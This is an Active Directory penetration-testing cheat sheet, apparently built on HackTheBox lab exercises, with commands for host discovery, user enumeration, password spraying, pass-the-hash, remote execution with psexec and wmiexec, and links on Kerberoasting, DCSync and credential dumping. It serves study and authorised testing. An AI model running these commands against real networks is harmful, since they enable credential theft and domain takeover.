# Penetration Testing all step

## Command Syntaxis
```
https://wadcoms.github.io/
```

### 1. Host Reconnaissance and Network Enumeration

```
# Find Active Hosts
sudo nmap -sn -n --max-retries 1 --max-rate 10 --data-length 24 192.168.1.0/24
fping -asgq 172.16.7.0/23

# Specific Host
nmap -p- -Pn -T4 --min-rate 2000 --stats-every 50 --max-retries 2 10.10.10.10 ( Fast Scan )
```
---

### DNS Enumeration
[DNS Attacks and Enumeration](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Services/Services-Attacks/DNS-Attack.md)
---

### Pivoting and Internal Network Discovery
```powershell
Ligolo-ng

Windows:
$path = "$env:USERPROFILE\Desktop\live_hosts.txt"
$subnet = "172.16.6"
1..254 | ForEach-Object {
    $ip = "$subnet.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet -BufferSize 16 -Delay 1) {
        Write-Host "$ip Reply" -ForegroundColor Green
        $ip | Out-File -FilePath $path -Append
    }
}

Linux:
#!/bin/bash
output_file="$HOME/Desktop/live_hosts.txt"
subnet="172.16.6"
trap "echo -e '\nScan interrupted by user. Exiting...'; exit" SIGINT
> "$output_file"
echo "Scanning subnet $subnet.0/24... Press Ctrl+C to stop."
for i in {1..254}
do
    ip="$subnet.$i"
    # -c 1: send 1 packet
    # -W 1: wait 1 second
    if ping -c 1 -W 1 "$ip" &> /dev/null; then
        echo "$ip Reply"
        echo "$ip" >> "$output_file"
    fi
done
echo "Scan complete."

msf6 > use post(multi/gather/ping_sweep
msf6 post(multi/gather/ping_sweep > set RHOSTS 172.16.5.0/24
msf6 post(multi/gather/ping_sweep > set SESSION 1
msf6 post(multi/gather/ping_sweep > run
```

### 2. Service Enumeration
[Service Enumeration üçün bu fayllara bax](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Services)
---

### 3. Vulnerability Scanner
[Servislərə özəl zəiflikləri axtarmaq üçün](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Services/Services-Attacks)
---

### 4. LDAP Enumeration
[LDAP Sorğuları ilə araşdırma](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Protocols/LDAP/LDAP-Architecture.md)
---

### 5. SMB Enumeration
[SMB Protokolu ilə araşdırma](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Services/Services-Attacks/SMB-Attack.md)
---

### 6. LLMNR/mDNS/NB-NS Poisining
[LLMNR/mDNS/NB-NS Poisoning Faylına Get](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LLMNR-NBTNS-mDNS-Poisining.md)
---

### 7. Credentials
[Username və Password tapılması üçün](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/Enumeration/Username_Password-Enumeration.md)
---

### 8. Password Policy
```
1) crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

2) rpcclient -U "" -N 172.16.5.5
getdompwinfo

3) enum4linux -P 172.16.5.5

4) ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

5) C:\htb> net accounts

6) import-module .\PowerView.ps1
Get-DomainPolicy
```
---

### 9. Enumerate Username
```
https://github.com/insidetrust/statistically-likely-usernames
https://github.com/initstring/linkedin2username

NTLM Relay or Responder

enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

rpcclient -U "" -N 172.16.5.5
enumdomusers

crackmapexec smb 172.16.5.5 --users

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

```
---

### 10. Password Spraying
```
# Linux
for u in $(cat wordlist.txt);do rpcclient -U "username%password" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +


# Windows
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
---

## 11. Credentialed Enumeration
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

rpcclient -U "" -N 172.16.5.5
enumdomusers
user:[administrator] rid:[0x1f4]
queryuser 0x1f4

https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
https://github.com/fortra/impacket/blob/master/examples/psexec.py
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5

https://github.com/ropnop/windapsearch
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

https://github.com/dirkjanm/BloodHound.py
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
```
---

### 12. Credential Enumeration - From Windows
```
# Active Directory Module

Import-Module ActiveDirectory
Get-ADDomain

# User & Group
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select Name

# SPN Users List
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName,ServicePrincipalNames | 
Where-Object {$_.ServicePrincipalName -match "HTTP/|MSSQL/|CIFS/"} | 
Select Name, ServicePrincipalName

# Kerberoastable Users
Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and ServicePrincipalNames -like "*/*"} -Properties ServicePrincipalName,ServicePrincipalNames | Select Name, ServicePrincipalName | Sort Name

Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
Get-ADGroupMember -Identity "Backup Operators"

# PoverView
## Special User
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

# Local Admin
Get-NetLocalGroupMember -ComputerName TARGETHOST -GroupName "Administrators"

# Deactive Account
Get-DomainUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"

Get-DomainGroupMember -Identity "Domain Admins" -Recurse

Get-DomainTrustMapping

Test-AdminAccess -ComputerName ACADEMY-EA-MS01

Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

# Snaffler

.\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data -o result_snaffler.txt
```
---

### 13. Living off the Land
[PowerShell və CMD vasitəsilə maksimum məlumat əldə etmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/Living%20Of%20The%20Land.md)
---

### Local Privilege Escalation
[Windows Privilege Escalation](https://github.com/Aghalarovf/Penetration-Tester/tree/main/Technical_Notes/Privilege%20Escalation/Windows)
---

### 14. Enumeration with PowerView
```
1. Domain məlumatını al
2. Domain Controller-ları tap
3. Domain Password Policy-ni al
4. Domain SID-i öyrən
5. Forest məlumatını al
6. Forest-dəki bütün domain-ları tap
7. AD Subnet-lərini tap
8. Bütün user-ları listələ
9. Xüsusi bir user haqqında məlumat al
10. AdminCount=1 olan hesabları tap
11. SPN olan hesabları tap (Kerberoasting)
12. Pre-Authentication tələb etməyən hesablar (ASREPRoast)
13. Aktiv (enabled) user-ları tap
14. Bütün qrupları listələ
15. Qrup üzvləri
16. Nested (iç-içə) qrup üzvlüyünü tap
17. Bir user-in aid olduğu bütün qrupları tap
18. Adında "admin" keçən qrupları tap
19. Bir kompüterdəki lokal qrupları tap
20. Protected Users qrupunu yoxla
21. Bütün kompüterləri listələ
22. Server-ləri filtrele
23. Köhnə versiyalı komputerlər
24. Aktiv (ping olan) kompüterləri tap
25. Bir kompüter haqqında tam məlumat al
26. Unconstrained Delegation olan kompüterləri tap
27. Constrained Delegation olan kompüterləri tap
27. Unconstrained Delegation olan User-lər
27. Certificate Services (AD CS) Enumeration
28. LAPS aktiv olan kompüterləri tap
28. LAPS Şifrələrini Oxumaq
29. Kompüterlərin SPN-lərini tap
30. Bir user üzərindəki ACL-ləri al
31. Müəyyən icazəsi olan userləri tap
32. ForceChangePassword icazəsini tap
33. Bütün domain üzərindəki maraqlı ACL-ləri tap
34. Domain root üzərindəki ACL-lər
35. DCSync icazəsini tap
36. Bir qrup üzərindəki ACL-ləri al
37. AddMember icazəsini tap
38. Domain trust-larını tap
39. Forest trust-larını tap
40. External trust-ları tap
41. SID Filtering statusunu yoxla
42. Bidirectional trust-ları tap
43. Trust xəritəsini çıxar
44. Bütün forest-dəki user-ları say
45. Child domain-ları tap
46. Bütün GPO-ları listələ
47. Bir kompüterə tətbiq edilən GPO-ları tap
48. Bir user-ə tətbiq edilən GPO-ları tap
49. GPO üzərindəki ACL-ləri tap
50. OU-ya linklənmiş GPO-ları tap
51. Resource-Based Constrained Delegation (RBCD)
52. krbtgt hesabı haqqında məlumat al
53. Yüksək dəyərli SPN-ləri tap
54. Delegation üçün uyğun service-ləri tap
55. Kerberos Policy-ni öyrən
56. Aktiv şəbəkə session-larını tap
57. Hazırda login olan user-ləri tap
58. Lokal admin olduğun maşınları tap
59. Domain Admins-in session-unu stealth şəkildə tap
60. SMB share-lərini tap
61. Accessible share-ləri tap
62. Share-lərdə maraqlı faylları tap
63. AdminSDHolder-in qoruduğu hesabları tap
64. Schema Admins qrupunu tap
65. ms-DS-MachineAccountQuota dəyərini yoxla
66. Shadow Credentials atributunu yoxla
67. BloodHound üçün data topla
68. Bütün domain-ın ümumi statistikasını çıxar
```
---

### 15. AS-REP Roasting
[Pre-Auth bağlı userləri tapıb hash çəkmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)
---

### 16. LAPS Dumping
[LAPS vasitəsilə istifadəçilərin şifrələrini ələ keçirmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD%20Guides/LAPS%20Dumping.md)
---

### 17. Kerberoasting
[SPN Userləri tapıb Kerberoating edərək KRB5 hash əldə etmək və offline sındırmaq](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Kerberoasting.md)
---

### 18. DCSync Attacks
[DCSync hücumu ilə Hashləri dump etmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/DCSync.md)
---


### 19. SAM/SECURITY/SYSTEM Dump
[SAM SECURITY SYSTEM Fayllarını dump edərək istifadəçi hash ləri əldə etmək](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/SAM-SYSTEM-SECURITY%20Dump.md)
---

### 20. LSASS Dump
[LSASS Dump Technique](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/LSASS%20Dump.md)
---

### 21. NTDS.dit Dump
[NTDS.dit ilə Hash Dump](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/NTDS%20Dump.md)
---

### 22. Credential Manager
[Credential Vault](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/Windows%20Credential%20Manager.md)
---

### 23. noPAC + PrintNightmare + PetitPotam
[This Attack](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/BleedingEdge.md)
---

### 
